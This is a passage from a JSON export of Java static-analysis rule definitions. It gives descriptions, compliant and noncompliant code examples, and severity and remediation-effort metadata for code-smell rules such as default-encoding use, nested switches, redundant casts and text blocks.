            "htmlDesc": "<p>Using classes and methods that rely on the default system encoding can result in code that works fine in its \"home\" environment. But that code may\nbreak for customers who use different encodings in ways that are extremely difficult to diagnose and nearly, if not completely, impossible to\nreproduce when it's time to fix them.</p>\n<p>This rule detects uses of the following classes and methods:</p>\n<ul>\n  <li> <code>FileReader</code> </li>\n  <li> <code>FileWriter</code> </li>\n  <li> String constructors with a <code>byte[]</code> argument but no <code>Charset</code> argument\n    <ul>\n      <li> <code>String(byte[] bytes)</code> </li>\n      <li> <code>String(byte[] bytes, int offset, int length)</code> </li>\n    </ul> </li>\n  <li> <code>String.getBytes()</code> </li>\n  <li> <code>String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin)</code> </li>\n  <li> <code>InputStreamReader(InputStream in)</code> </li>\n  <li> <code>OutputStreamWriter(OutputStream out)</code> </li>\n  <li> <code>ByteArrayOutputStream.toString()</code> </li>\n  <li> Some <code>Formatter</code> constructors\n    <ul>\n      <li> <code>Formatter(String fileName)</code> </li>\n      <li> <code>Formatter(File file)</code> </li>\n      <li> <code>Formatter(OutputStream os)</code> </li>\n    </ul> </li>\n  <li> Some <code>Scanner</code> constructors\n    <ul>\n      <li> <code>Scanner(File source)</code> </li>\n      <li> <code>Scanner(Path source)</code> </li>\n      <li> <code>Scanner(InputStream source)</code> </li>\n    </ul> </li>\n  <li> Some <code>PrintStream</code> constructors\n    <ul>\n      <li> <code>PrintStream(File file)</code> </li>\n      <li> <code>PrintStream(OutputStream out)</code> </li>\n      <li> <code>PrintStream(OutputStream out, boolean autoFlush)</code> </li>\n      <li> <code>PrintStream(String fileName)</code> </li>\n    </ul> </li>\n  <li> Some <code>PrintWriter</code> constructors\n    <ul>\n      <li> <code>PrintWriter(File file)</code> </li>\n      <li> <code>PrintWriter(OutputStream out)</code> </li>\n      <li> <code>PrintWriter(OutputStream out, boolean autoFlush)</code> </li>\n      <li> <code>PrintWriter(String fileName)</code> </li>\n    </ul> </li>\n  <li> methods from Apache commons-io library which accept an encoding argument when that argument is null, and overloads of those methods that omit\n  the encoding argument\n    <ul>\n      <li> <code>IOUtils.copy(InputStream, Writer)</code> </li>\n      <li> <code>IOUtils.copy(Reader, OutputStream)</code> </li>\n      <li> <code>IOUtils.readLines(InputStream)</code> </li>\n      <li> <code>IOUtils.toByteArray(Reader)</code> </li>\n      <li> <code>IOUtils.toByteArray(String)</code> </li>\n      <li> <code>IOUtils.toCharArray(InputStream)</code> </li>\n      <li> <code>IOUtils.toInputStream(TypeCriteria.subtypeOf(CharSequence))</code> </li>\n      <li> <code>IOUtils.toString(byte[])</code> </li>\n      <li> <code>IOUtils.toString(URI)</code> </li>\n      <li> <code>IOUtils.toString(URL)</code> </li>\n      <li> <code>IOUtils.write(char[], OutputStream)</code> </li>\n      <li> <code>IOUtils.write(CharSequence, OutputStream)</code> </li>\n      <li> <code>IOUtils.writeLines(Collection, String, OutputStream)</code> </li>\n      <li> <code>FileUtils.readFileToString(File)</code> </li>\n      <li> <code>FileUtils.readLines(File)</code> </li>\n      <li> <code>FileUtils.write(File, CharSequence)</code> </li>\n      <li> <code>FileUtils.write(File, CharSequence, boolean)</code> </li>\n      <li> <code>FileUtils.writeStringToFile(File, String)</code> </li>\n    </ul> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/pzdGBQ\">CERT, STR04-J.</a> - Use compatible character encodings when communicating string data\n  between JVMs </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ujZGBQ\">CERT, STR50-J.</a> - Use the appropriate method for counting characters in a string\n  </li>\n</ul>",
            "mdDesc": "<p>Using classes and methods that rely on the default system encoding can result in code that works fine in its \"home\" environment. But that code may\nbreak for customers who use different encodings in ways that are extremely difficult to diagnose and nearly, if not completely, impossible to\nreproduce when it's time to fix them.</p>\n<p>This rule detects uses of the following classes and methods:</p>\n<ul>\n  <li> <code>FileReader</code> </li>\n  <li> <code>FileWriter</code> </li>\n  <li> String constructors with a <code>byte[]</code> argument but no <code>Charset</code> argument\n    <ul>\n      <li> <code>String(byte[] bytes)</code> </li>\n      <li> <code>String(byte[] bytes, int offset, int length)</code> </li>\n    </ul> </li>\n  <li> <code>String.getBytes()</code> </li>\n  <li> <code>String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin)</code> </li>\n  <li> <code>InputStreamReader(InputStream in)</code> </li>\n  <li> <code>OutputStreamWriter(OutputStream out)</code> </li>\n  <li> <code>ByteArrayOutputStream.toString()</code> </li>\n  <li> Some <code>Formatter</code> constructors\n    <ul>\n      <li> <code>Formatter(String fileName)</code> </li>\n      <li> <code>Formatter(File file)</code> </li>\n      <li> <code>Formatter(OutputStream os)</code> </li>\n    </ul> </li>\n  <li> Some <code>Scanner</code> constructors\n    <ul>\n      <li> <code>Scanner(File source)</code> </li>\n      <li> <code>Scanner(Path source)</code> </li>\n      <li> <code>Scanner(InputStream source)</code> </li>\n    </ul> </li>\n  <li> Some <code>PrintStream</code> constructors\n    <ul>\n      <li> <code>PrintStream(File file)</code> </li>\n      <li> <code>PrintStream(OutputStream out)</code> </li>\n      <li> <code>PrintStream(OutputStream out, boolean autoFlush)</code> </li>\n      <li> <code>PrintStream(String fileName)</code> </li>\n    </ul> </li>\n  <li> Some <code>PrintWriter</code> constructors\n    <ul>\n      <li> <code>PrintWriter(File file)</code> </li>\n      <li> <code>PrintWriter(OutputStream out)</code> </li>\n      <li> <code>PrintWriter(OutputStream out, boolean autoFlush)</code> </li>\n      <li> <code>PrintWriter(String fileName)</code> </li>\n    </ul> </li>\n  <li> methods from Apache commons-io library which accept an encoding argument when that argument is null, and overloads of those methods that omit\n  the encoding argument\n    <ul>\n      <li> <code>IOUtils.copy(InputStream, Writer)</code> </li>\n      <li> <code>IOUtils.copy(Reader, OutputStream)</code> </li>\n      <li> <code>IOUtils.readLines(InputStream)</code> </li>\n      <li> <code>IOUtils.toByteArray(Reader)</code> </li>\n      <li> <code>IOUtils.toByteArray(String)</code> </li>\n      <li> <code>IOUtils.toCharArray(InputStream)</code> </li>\n      <li> <code>IOUtils.toInputStream(TypeCriteria.subtypeOf(CharSequence))</code> </li>\n      <li> <code>IOUtils.toString(byte[])</code> </li>\n      <li> <code>IOUtils.toString(URI)</code> </li>\n      <li> <code>IOUtils.toString(URL)</code> </li>\n      <li> <code>IOUtils.write(char[], OutputStream)</code> </li>\n      <li> <code>IOUtils.write(CharSequence, OutputStream)</code> </li>\n      <li> <code>IOUtils.writeLines(Collection, String, OutputStream)</code> </li>\n      <li> <code>FileUtils.readFileToString(File)</code> </li>\n      <li> <code>FileUtils.readLines(File)</code> </li>\n      <li> <code>FileUtils.write(File, CharSequence)</code> </li>\n      <li> <code>FileUtils.write(File, CharSequence, boolean)</code> </li>\n      <li> <code>FileUtils.writeStringToFile(File, String)</code> </li>\n    </ul> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/pzdGBQ\">CERT, STR04-J.</a> - Use compatible character encodings when communicating string data\n  between JVMs </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ujZGBQ\">CERT, STR50-J.</a> - Use the appropriate method for counting characters in a string\n  </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "i18n",
                "unpredictable"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2912",
            "repo": "java",
            "name": "\"indexOf\" checks should use a start position",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>One thing that makes good code good is the clarity with which it conveys the intent of the original programmer to maintainers, and the proper\nchoice of <code>indexOf</code> methods can help move code from confusing to clear.</p>\n<p>If you need to see whether a substring is located beyond a certain point in a string, you can test the <code>indexOf</code> the substring versus\nthe target point, or you can use the version of <code>indexOf</code> which takes a starting point argument. The latter is arguably clearer because the\nresult is tested against -1, which is an easily recognizable \"not found\" indicator.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString name = \"ismael\";\n\nif (name.indexOf(\"ae\") &gt; 2) { // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString name = \"ismael\";\n\nif (name.indexOf(\"ae\", 2) &gt; -1) {\n  // ...\n}\n</pre>",
            "mdDesc": "<p>One thing that makes good code good is the clarity with which it conveys the intent of the original programmer to maintainers, and the proper\nchoice of <code>indexOf</code> methods can help move code from confusing to clear.</p>\n<p>If you need to see whether a substring is located beyond a certain point in a string, you can test the <code>indexOf</code> the substring versus\nthe target point, or you can use the version of <code>indexOf</code> which takes a starting point argument. The latter is arguably clearer because the\nresult is tested against -1, which is an easily recognizable \"not found\" indicator.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString name = \"ismael\";\n\nif (name.indexOf(\"ae\") &gt; 2) { // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString name = \"ismael\";\n\nif (name.indexOf(\"ae\", 2) &gt; -1) {\n  // ...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1700",
            "repo": "java",
            "name": "A field should not duplicate the name of its containing class",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It's confusing to have a class member with the same name (case differences aside) as its enclosing class. This is particularly so when you consider\nthe common practice of naming a class instance for the class itself.</p>\n<p>Best practice dictates that any field or member with the same name as the enclosing class be renamed to be more descriptive of the particular\naspect of the class it represents or holds.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo {\n  private String foo;\n\n  public String getFoo() { }\n}\n\nFoo foo = new Foo();\nfoo.getFoo() // what does this return?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo {\n  private String name;\n\n  public String getName() { }\n}\n\n//...\n\nFoo foo = new Foo();\nfoo.getName()\n\n</pre>\n<h2>Exceptions</h2>\n<p>When the type of the field is the containing class and that field is static, no issue is raised to allow singletons named like the type. </p>\n<pre>\npublic class Foo {\n  ...\n  private static Foo foo;\n  public Foo getInstance() {\n    if(foo==null) {\n      foo = new Foo();\n    }\n    return foo;\n  }\n  ...\n}\n</pre>",
            "mdDesc": "<p>It's confusing to have a class member with the same name (case differences aside) as its enclosing class. This is particularly so when you consider\nthe common practice of naming a class instance for the class itself.</p>\n<p>Best practice dictates that any field or member with the same name as the enclosing class be renamed to be more descriptive of the particular\naspect of the class it represents or holds.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo {\n  private String foo;\n\n  public String getFoo() { }\n}\n\nFoo foo = new Foo();\nfoo.getFoo() // what does this return?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo {\n  private String name;\n\n  public String getName() { }\n}\n\n//...\n\nFoo foo = new Foo();\nfoo.getName()\n\n</pre>\n<h2>Exceptions</h2>\n<p>When the type of the field is the containing class and that field is static, no issue is raised to allow singletons named like the type. </p>\n<pre>\npublic class Foo {\n  ...\n  private static Foo foo;\n  public Foo getInstance() {\n    if(foo==null) {\n      foo = new Foo();\n    }\n    return foo;\n  }\n  ...\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1821",
            "repo": "java",
            "name": "\"switch\" statements should not be nested",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as\nbelonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>\n<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving\nthe inner <code>switch</code> to another function.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid foo(int n, int m) {\n  switch (n) {\n    case 0:\n      switch (m) {  // Noncompliant; nested switch\n        // ...\n      }\n    case 1:\n      // ...\n    default:\n      // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid foo(int n, int m) {\n  switch (n) {\n    case 0:\n      bar(m);\n    case 1:\n      // ...\n    default:\n      // ...\n  }\n}\n\nvoid bar(int m){\n  switch(m) {\n    // ...\n  }\n}\n</pre>",
            "mdDesc": "<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as\nbelonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>\n<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving\nthe inner <code>switch</code> to another function.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid foo(int n, int m) {\n  switch (n) {\n    case 0:\n      switch (m) {  // Noncompliant; nested switch\n        // ...\n      }\n    case 1:\n      // ...\n    default:\n      // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid foo(int n, int m) {\n  switch (n) {\n    case 0:\n      bar(m);\n    case 1:\n      // ...\n    default:\n      // ...\n  }\n}\n\nvoid bar(int m){\n  switch(m) {\n    // ...\n  }\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1942",
            "repo": "java",
            "name": "Simple class names should be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Java's <code>import</code> mechanism allows the use of simple class names. Therefore, using a class' fully qualified name in a file that\n<code>import</code>s the class is redundant and confusing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport java.util.List;\nimport java.sql.Timestamp;\n\n//...\n\njava.util.List&lt;String&gt; myList;  // Noncompliant\njava.sql.Timestamp tStamp; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport java.util.List;\nimport java.sql.Timestamp;\n\n//...\n\nList&lt;String&gt; myList;\nTimestamp tStamp;\n</pre>",
            "mdDesc": "<p>Java's <code>import</code> mechanism allows the use of simple class names. Therefore, using a class' fully qualified name in a file that\n<code>import</code>s the class is redundant and confusing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport java.util.List;\nimport java.sql.Timestamp;\n\n//...\n\njava.util.List&lt;String&gt; myList;  // Noncompliant\njava.sql.Timestamp tStamp; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport java.util.List;\nimport java.sql.Timestamp;\n\n//...\n\nList&lt;String&gt; myList;\nTimestamp tStamp;\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing",
                "redundant"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1941",
            "repo": "java",
            "name": "Variables should not be declared before they are relevant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>For the sake of clarity, variables should be declared as close to where they're used as possible. This is particularly true when considering\nmethods that contain early returns and the potential to throw exceptions. In these cases, it is not only pointless, but also confusing to declare a\nvariable that may never be used because conditions for an early return are met first.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boolean isConditionMet(int a, int b) {\n  int difference = a - b;\n  MyClass foo = new MyClass(a);  // Noncompliant; not used before early return\n\n  if (difference &lt; 0) {\n    return false;\n  }\n\n  // ...\n\n  if (foo.doTheThing()) {\n    return true;\n  }\n  return false;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean isConditionMet(int a, int b) {\n  int difference = a - b;\n\n  if (difference &lt; 0) {\n    return false;\n  }\n\n  // ...\n\n  MyClass foo = new MyClass(a);\n  if (foo.doTheThing()) {\n    return true;\n  }\n  return false;\n}\n</pre>",
            "mdDesc": "<p>For the sake of clarity, variables should be declared as close to where they're used as possible. This is particularly true when considering\nmethods that contain early returns and the potential to throw exceptions. In these cases, it is not only pointless, but also confusing to declare a\nvariable that may never be used because conditions for an early return are met first.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boolean isConditionMet(int a, int b) {\n  int difference = a - b;\n  MyClass foo = new MyClass(a);  // Noncompliant; not used before early return\n\n  if (difference &lt; 0) {\n    return false;\n  }\n\n  // ...\n\n  if (foo.doTheThing()) {\n    return true;\n  }\n  return false;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean isConditionMet(int a, int b) {\n  int difference = a - b;\n\n  if (difference &lt; 0) {\n    return false;\n  }\n\n  // ...\n\n  MyClass foo = new MyClass(a);\n  if (foo.doTheThing()) {\n    return true;\n  }\n  return false;\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1820",
            "repo": "java",
            "name": "Classes should not have too many fields",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain, and\nhaving a lot of fields is an indication that a class has grown too large.</p>\n<p>Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>",
            "mdDesc": "<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain, and\nhaving a lot of fields is an indication that a class has grown too large.</p>\n<p>Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "countNonpublicFields",
                    "htmlDesc": "Whether or not to include non-public fields in the count",
                    "defaultValue": "true",
                    "type": "BOOLEAN"
                },
                {
                    "key": "maximumFieldThreshold",
                    "htmlDesc": "The maximum number of fields",
                    "defaultValue": "20",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1h",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1h",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1h",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1h",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1939",
            "repo": "java",
            "name": "Extensions and implementations should not be redundant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>All classes extend <code>Object</code> implicitly. Doing so explicitly is redundant.</p>\n<p>Further, declaring the implementation of an interface <em>and</em> one if its parents is also redundant. If you implement the interface, you also\nimplicitly implement its parents and there's no need to do so explicitly.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface MyFace {\n  // ...\n}\n\npublic interface MyOtherFace extends MyFace {\n  // ...\n}\n\npublic class Foo\n    extends Object // Noncompliant\n    implements MyFace, MyOtherFace {  // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic interface MyFace {\n  // ...\n}\n\npublic interface MyOtherFace extends MyFace {\n  // ...\n}\n\npublic class Foo implements MyOtherFace {\n  //...\n}\n</pre>",
            "mdDesc": "<p>All classes extend <code>Object</code> implicitly. Doing so explicitly is redundant.</p>\n<p>Further, declaring the implementation of an interface <em>and</em> one if its parents is also redundant. If you implement the interface, you also\nimplicitly implement its parents and there's no need to do so explicitly.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface MyFace {\n  // ...\n}\n\npublic interface MyOtherFace extends MyFace {\n  // ...\n}\n\npublic class Foo\n    extends Object // Noncompliant\n    implements MyFace, MyOtherFace {  // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic interface MyFace {\n  // ...\n}\n\npublic interface MyOtherFace extends MyFace {\n  // ...\n}\n\npublic class Foo implements MyOtherFace {\n  //...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S6035",
            "repo": "java",
            "name": "Single-character alternations in regular expressions should be replaced with character classes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When an alternation contains multiple alternatives that consist of a single character, it can be rewritten as a character class. This should be\npreferred because it is more efficient and can even help prevent stack overflows when used inside a repetition (see rule <a href='/coding_rules#rule_key=java%3AS5998'>S5998</a>).</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"a|b|c\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"[abc]\");\n// or\nPattern.compile(\"[a-c]\");\n</pre>",
            "mdDesc": "<p>When an alternation contains multiple alternatives that consist of a single character, it can be rewritten as a character class. This should be\npreferred because it is more efficient and can even help prevent stack overflows when used inside a repetition (see rule {rule:java:S5998}).</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"a|b|c\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"[abc]\");\n// or\nPattern.compile(\"[a-c]\");\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1905",
            "repo": "java",
            "name": "Redundant casts should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Unnecessary casting expressions make the code harder to read and understand.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void example() {\n  for (Foo obj : (List&lt;Foo&gt;) getFoos()) {  // Noncompliant; cast unnecessary because List&lt;Foo&gt; is what's returned\n    //...\n  }\n}\n\npublic List&lt;Foo&gt; getFoos() {\n  return this.foos;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void example() {\n  for (Foo obj : getFoos()) {\n    //...\n  }\n}\n\npublic List&lt;Foo&gt; getFoos() {\n  return this.foos;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Casting may be required to distinguish the method to call in the case of overloading:</p>\n<pre>\nclass A {}\nclass B extends A{}\nclass C {\n  void fun(A a){}\n  void fun(B b){}\n\n  void foo() {\n    B b = new B();\n    fun(b);\n    fun((A) b); //call the first method so cast is not redundant.\n  }\n\n}\n</pre>",
            "mdDesc": "<p>Unnecessary casting expressions make the code harder to read and understand.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void example() {\n  for (Foo obj : (List&lt;Foo&gt;) getFoos()) {  // Noncompliant; cast unnecessary because List&lt;Foo&gt; is what's returned\n    //...\n  }\n}\n\npublic List&lt;Foo&gt; getFoos() {\n  return this.foos;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void example() {\n  for (Foo obj : getFoos()) {\n    //...\n  }\n}\n\npublic List&lt;Foo&gt; getFoos() {\n  return this.foos;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Casting may be required to distinguish the method to call in the case of overloading:</p>\n<pre>\nclass A {}\nclass B extends A{}\nclass C {\n  void fun(A a){}\n  void fun(B b){}\n\n  void foo() {\n    B b = new B();\n    fun(b);\n    fun((A) b); //call the first method so cast is not redundant.\n  }\n\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "redundant"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S6126",
            "repo": "java",
            "name": "String multiline concatenation can be replaced with Text Blocks",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In Java 15 Text Blocks are now official and can be used. The most common pattern for multiline strings in Java &lt; 15 was to write String\nconcatenation. Now it's possible to do it in a more natural way using Text Blocks.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString textBlock =\n               \"&lt;html&gt;\\n\" +\n               \"    &lt;body&gt;\\n\" +\n               \"        &lt;tag&gt;\\n\" +\n               \"        &lt;/tag&gt;\\n\" +\n               \"    &lt;/body&gt;\\n\" +\n               \"&lt;/html&gt;\";\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString textBlock = \"\"\"\n        &lt;html&gt;\n            &lt;body&gt;\n                &lt;tag&gt;\n                &lt;/tag&gt;\n            &lt;/body&gt;\n        &lt;/html&gt;\"\"\";\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/368\">JEP 368: Text Blocks</a> (Second Preview) </li>\n  <li> <a href=\"https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html\">Programmer's Guide To Text Blocks</a>, by Jim Laskey and Stuart\n  Marks </li>\n</ul>",
